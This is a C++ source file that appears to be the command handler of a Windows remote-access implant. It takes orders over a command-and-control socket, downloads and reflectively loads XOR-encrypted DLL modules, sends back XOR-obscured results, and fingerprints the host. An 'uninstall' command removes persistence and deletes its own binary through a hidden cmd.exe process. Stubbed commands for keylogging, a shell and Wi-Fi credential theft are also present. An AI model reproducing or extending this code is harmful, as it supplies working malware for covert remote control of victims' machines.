// Core/commands.cpp 
#include "commands.h"
#include "persistence.h"
#include "loader.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <cstring>

extern SOCKET g_c2_socket;

static void module_send_result(const uint8_t* data, size_t len) {
    if (g_c2_socket != INVALID_SOCKET) {
        std::vector<uint8_t> buf(data, data + len);
        for (auto& b : buf) b ^= 0xAA;
        buf.push_back('\n');
        send(g_c2_socket, reinterpret_cast<const char*>(buf.data()), static_cast<int>(buf.size()), 0);
    }
}

static void module_log(const char* msg) {
    OutputDebugStringA("[MODULE] ");
    OutputDebugStringA(msg);
    OutputDebugStringA("\n");
}

typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize; ULONG dwMajorVersion; ULONG dwMinorVersion; ULONG dwBuildNumber; ULONG dwPlatformId; WCHAR szCSDVersion[128];
} MY_OSVERSIONINFOW;
typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    if (cmd == "ping") return "pong";
    
    else if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
        std::string module_name = cmd.substr(12);
        
        std::vector<uint8_t> dll_data;
        if (!download_module(module_name, dll_data))
            return "MODULE_DOWNLOAD_FAILED";
        
        xor_decrypt(dll_data);
        
        void* modbase = nullptr;
        if (!load_reflective_dll(dll_data, modbase))
            return "MODULE_LOAD_FAILED";
        
        ModuleAPI api = { module_send_result, module_log, nullptr };
        if (!execute_module(modbase, api))
            return "MODULE_EXECUTION_FAILED";
        
        return "MODULE_LOADED_OK";
    }
    
    else if (cmd == "info") {
        char host[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD s = sizeof(host);
        if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
        
        ULONG major = 0, minor = 0, build = 0; 
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pRtlGetVersion pRtlGetVer = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVer) {
                MY_OSVERSIONINFOW rovi = {0};
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (pRtlGetVer(&rovi) == 0) {
                    major = rovi.dwMajorVersion;
                    minor = rovi.dwMinorVersion;
                    build = rovi.dwBuildNumber;
                }
            }
        }
        
        std::string os_name = "Windows";
        if (major == 10 && build >= 22000) os_name = "Windows 11";
        else if (major == 10) os_name = "Windows 10";
        else if (major == 6) os_name = "Windows 7/8";

        char buf[256];
        sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
        return std::string(buf);
    } 
    
    else if (cmd == "uninstall") {
        uninstall_persistence();
        char path[MAX_PATH];
        if (GetModuleFileNameA(NULL, path, MAX_PATH) > 0) {
            char del_cmd[1024];
            sprintf_s(del_cmd, 
                "cmd.exe /c ping 127.0.0.1 -n 5 >nul && attrib -r -s -h \"%s\" && del /f /q \"%s\"", 
                path, path);
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi = { 0 };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            if (CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE, 
                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        if (sock != INVALID_SOCKET) closesocket(sock);
        ExitProcess(0);
    }
    
    else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
    else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
    else if (cmd.find("shell") != std::string::npos) return "SHELL_DISABLED";
    else if (cmd.find("steal_wifi") != std::string::npos) return "STEAL_DISABLED";
    
    return "UNKNOWN_COMMAND";
}